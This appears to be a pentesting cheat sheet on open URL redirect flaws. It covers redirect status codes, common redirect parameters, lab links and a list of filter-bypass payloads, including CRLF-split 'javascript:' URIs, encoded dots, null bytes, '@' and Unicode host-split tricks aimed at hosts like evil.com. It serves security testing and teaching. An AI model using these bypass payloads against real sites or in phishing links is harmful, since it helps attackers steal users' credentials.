# Open URL Redirect

> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.


## Summary

* [Methodology](#methodology)
    * [HTTP Redirection Status Code](#http-redirection-status-code)
    * [Redirect Methods](#redirect-methods)
        * [Path-based Redirects](#path-based-redirects)
        * [JavaScript-based Redirects](#javascript-based-redirects)
        * [Common Query Parameters](#common-query-parameters)
    * [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)


## Methodology

An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.

**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.


## HTTP Redirection Status Code

HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:

- [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
- [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
- [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
- [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
- [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
- [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header. 
- [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
- [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.


## Redirect Methods

### Path-based Redirects

Instead of query parameters, redirection logic may rely on the path:

* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`


### JavaScript-based Redirects

If the application uses JavaScript for redirects, attackers may manipulate script variables:

**Example**:

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

**Payload**: `?redirectTo=http://malicious.com`


### Common Parameters

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```


## Filter Bypass

* Using a whitelisted domain or keyword
    ```powershell
    www.whitelisted.com.evil.com redirect to evil.com
    ```

* Using **CRLF** to bypass "javascript" blacklisted keyword
    ```powershell
    java%0d%0ascript%0d%0a:alert(0)
    ```

* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
    ```powershell
    //google.com
    ////google.com
    ```

* Using "https:" to bypass "`//`" blacklisted keyword
    ```powershell
    https:google.com
    ```

* Using "`\/\/`" to bypass "`//`" blacklisted keyword
    ```powershell
    \/\/google.com/
    /\/google.com/
    ```

* Using "`%E3%80%82`" to bypass "." blacklisted character
    ```powershell
    /?redir=google。com
    //google%E3%80%82com
    ```

* Using null byte "`%00`" to bypass blacklist filter
    ```powershell
    //google%00.com
    ```

* Using HTTP Parameter Pollution
    ```powershell
    ?next=whitelisted.com&next=google.com
    ```

* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
    ```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
    ```

* Creating folder as their domain
    ```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
    ```

* Using "`?`" character, browser will translate it to "`/?`"
    ```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
    ```

* Host/Split Unicode Normalization
    ```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
    ```


## Labs

* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)


## References

- [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
- [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://s0cket7.com/open-redirect-vulnerability/)
- [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
- [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)